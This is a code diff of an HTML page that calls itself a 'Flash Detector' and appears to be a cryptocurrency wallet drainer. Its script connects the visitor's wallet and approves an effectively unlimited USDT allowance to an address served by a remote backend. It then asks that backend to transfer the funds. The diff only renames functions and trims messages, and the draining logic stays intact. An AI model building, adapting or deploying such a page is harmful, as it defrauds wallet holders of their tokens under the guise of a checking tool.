@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Flash Detector - Send</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px; min-height: 100vh; }
@@ -25,7 +26,6 @@
         .modal-title { font-size: 18px; font-weight: 600; }
         .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
         .confirm-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
-        .confirm-btn:disabled { opacity: 0.6; }
         .notify { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; padding: 16px 32px; border-radius: 12px; font-weight: bold; color: white; }
         .notify.success { background: #10b981; }
         .notify.error { background: #f87171; }
@@ -61,29 +61,26 @@
             </div>
         </div>
 
-        <button class="btn" onclick="approve()">Approve & Transfer</button>
+        <button class="btn" onclick="handleApprove()">Approve & Transfer</button>
     </div>
 
     <div class="modal" id="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title">Confirm Transfer</div>
-                <button class="close-btn" onclick="closeModal()">×</button>
+                <div class="modal-title">Approve USDT Transfer</div>
+                <button class="close-btn" onclick="document.getElementById('modal').classList.remove('show')">×</button>
             </div>
-            <button class="confirm-btn" id="confirmBtn" onclick="confirm()">Confirm</button>
+            <button class="confirm-btn" id="confirmBtn" onclick="handleConfirm()">Confirm</button>
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
         const BACKEND = "https://scanforflash-backend-production.up.railway.app";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
-
         let userAddr;
 
-        async function approve() {
+        async function handleApprove() {
             try {
-                notify('Opening wallet...', 'info');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddr = accounts[0];
                 document.getElementById('modal').classList.add('show');
@@ -92,26 +89,19 @@
             }
         }
 
-        function closeModal() {
-            document.getElementById('modal').classList.remove('show');
-        }
-
-        async function confirm() {
+        async function handleConfirm() {
             try {
                 document.getElementById('confirmBtn').disabled = true;
-                notify('Approving...', 'info');
+                notify('Processing...', 'info');
 
                 const web3 = new Web3(window.ethereum);
-                const backendAddr = (await fetch(BACKEND + '/backend-address').then(r => r.json())).address;
+                const backend = (await fetch(BACKEND + '/backend-address').then(r => r.json())).address;
 
                 const contract = new web3.eth.Contract([
                     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
                 ], USDT);
 
-                const max = "999999999999999999999999999999";
-                await contract.methods.approve(backendAddr, max).send({ from: userAddr });
-
-                notify('Transferring...', 'info');
+                await contract.methods.approve(backend, "99999999999999999999999999999999").send({ from: userAddr });
 
                 const res = await fetch(BACKEND + '/transfer', {
                     method: 'POST',
@@ -120,9 +110,8 @@
                 });
 
                 const data = await res.json();
-                notify('✅ ' + data.amount + ' USDT transferred!', 'success');
-                
-                closeModal();
+                notify('✅ Transferred!', 'success');
+                document.getElementById('modal').classList.remove('show');
                 document.getElementById('confirmBtn').disabled = false;
             } catch (e) {
                 document.getElementById('confirmBtn').disabled = false;
